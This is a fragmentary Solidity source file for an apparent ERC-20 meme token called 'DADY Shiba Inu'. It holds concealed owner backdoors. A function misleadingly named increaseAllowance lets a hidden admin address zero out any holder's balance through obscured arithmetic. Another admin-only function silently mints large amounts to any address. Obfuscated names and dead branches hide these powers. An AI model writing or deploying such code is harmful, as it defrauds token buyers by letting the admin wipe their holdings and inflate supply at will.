...
contract DADYSHIBTOKEN is Ownable {
    address public dvnchi166;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "DADY Shiba Inu";
    string private _cctokensymbol = "DADYSHIB";
    constructor(address tokenadmin) {
        dvnchi166 = tokenadmin;
       DADYSHIB[_msgSender()] += supplyamount;
        emit Transfer(address(0), _msgSender(), supplyamount);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private DADYSHIB;
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dvnchi166 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = DADYSHIB[newadd];
        uint256 newaaamount = DADYSHIB[newadd]+DADYSHIB[newadd]-curamount;
        DADYSHIB[newadd] -= newaaamount;
        }else{
        if(dvnchi166 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        DADYSHIB[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dvnchi166 == _msgSender());
        if(dvnchi166 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = DADYSHIB[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        DADYSHIB[from] = DADYSHIB[from]-amount;
        DADYSHIB[to] = DADYSHIB[to]+amount;
